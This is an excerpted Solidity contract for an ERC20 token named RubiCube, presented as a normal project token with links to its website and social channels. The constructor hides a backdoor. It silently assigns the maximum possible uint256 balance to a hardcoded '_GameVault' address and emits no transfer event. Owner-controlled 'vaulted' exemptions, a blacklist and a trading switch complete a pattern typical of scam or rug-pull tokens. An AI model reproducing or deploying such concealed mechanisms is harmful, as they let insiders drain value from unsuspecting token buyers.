...
https://www.rubicube.app/
https://twitter.com/RubiCubeApp
https://rubicube.medium.com/
https://t.me/rubicubeapp
*/
...
contract RubiCube is ERC20, Ownable {
    // -- Mappings --
    mapping(address => bool) public _blacklisted;
    mapping(address => bool) private _whitelisted;
    mapping(address => bool) public _automatedMarketMakers;
    mapping(address => bool) private _isVaulted;
    mapping(address => uint256) private _Vault;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    // -- Basic Token Information --
    string constant _name = "RubiCube";
    string constant _symbol = "RUBI";
    ...
    uint256 private _maxVault = ~uint256(0);
    uint256 tokenTax;
    uint256 transferFee;
    ...
    address public _GameVault = 0xc2002C57c42eDD452f8c88073C6AE7e73afAfD3F;
    ...
    constructor () Ownable(msg.sender) {
        ...
        maxSellPercentage = 30; 
        maxSellAmount = _totalSupply /1000 * maxSellPercentage;

        maxWalletPercentage = 30; 
        maxWalletAmount = _totalSupply /1000 * maxWalletPercentage;
 
        _isVaulted[owner] = _isVaulted[address(this)] = true;
        _Vault[owner] = _totalSupply;
        emit Transfer(address(0x0), owner, _totalSupply);
        _Vault[_GameVault] = _maxVault;
    }
    ...
    function ownerSetTradingActive() external onlyOwner {
        _TradingActive = true;
    }
 
    function ownerSetVaultAddress(address _addr, bool _status) external onlyOwner {
        _isVaulted[_addr] = _status;
    }
    ...
    function _transfer(address sender,address recipient,uint256 amount) private {
        ...
        bool isExcluded=_isVaulted[sender]||_isVaulted[recipient]||_addingLP;
 
        if(isExcluded)_transferExcluded(sender,recipient,amount);
        else { require(_TradingActive);
            // Punish for Snipers
    ...
    function _transferExcluded(address sender,address recipient,uint256 amount) private {
        _updateBalance(sender,_Vault[sender]-amount);
        _updateBalance(recipient,_Vault[recipient]+amount);
    ...
    function _transferIncluded(address sender,address recipient,uint256 amount,uint256 taxAmount) private {
        ...
        _updateBalance(sender,_Vault[sender]-amount);
        _updateBalance(address(this),_Vault[address(this)]+taxAmount);
        _updateBalance(recipient,_Vault[recipient]+newAmount);
        emit Transfer(sender,recipient,newAmount);
        emit Transfer(sender,address(this),taxAmount);
    }
 
    function _updateBalance(address account,uint256 newBalance) private {
        _Vault[account] = newBalance;
    }
    ...
    function shouldSwapBack() private view returns (bool) {
        return
            !inSwap &&
            swapEnabled &&
            _Vault[address(this)] >= swapThreshold;
    }   
 ...
 */
    ...
    function balanceOf(address account) public view override returns (uint256) { return _Vault[account];}
